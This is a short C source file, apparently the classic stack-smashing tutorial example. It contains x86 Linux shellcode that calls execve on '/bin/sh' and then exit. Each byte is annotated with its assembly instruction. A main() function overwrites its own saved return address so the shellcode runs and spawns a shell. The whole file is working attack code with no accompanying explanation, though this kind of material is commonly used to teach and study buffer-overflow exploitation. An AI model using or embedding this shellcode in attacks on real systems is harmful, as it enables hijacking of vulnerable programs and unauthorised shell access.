char shellcode[] = 
   "\xeb\x1f"             // jmp 0x1f              # 2 bytes 
   "\x5e"                 // popl %esi             # 1 byte 
   "\x89\x76\x08"         // movl %esi,0x8(%esi)   # 3 bytes
   "\x31\xc0"             // xorl %eax,%eax        # 2 bytes 
   "\x88\x46\x07"         // movb %eax,0x7(%esi)   # 3 bytes 
   "\x89\x46\x0c"         // movl %eax,0xc(%esi)   # 3 bytes 
   "\xb0\x0b"             // movb $0xb,%al         # 2 bytes 
   "\x89\xf3"             // movl %esi,%ebx        # 2 bytes 
   "\x8d\x4e\x08"         // leal 0x8(%esi),%ecx   # 3 bytes
   "\x8d\x56\x0c"         // leal 0xc(%esi),%edx   # 3 bytes
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\x31\xdb"             // xorl %ebx,%ebx        # 2 bytes 
   "\x89\xd8"             // movl %ebx,%eax        # 2 bytes 
   "\x40"                 // inc %eax              # 1 bytes 
   "\xcd\x80"             // int $0x80             # 2 bytes
   "\xe8\xdc\xff\xff\xff" // call -0x24            # 5 bytes
   "/bin/sh";             // .string \"/bin/sh\"   # 8 bytes


void main() { 
  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
} 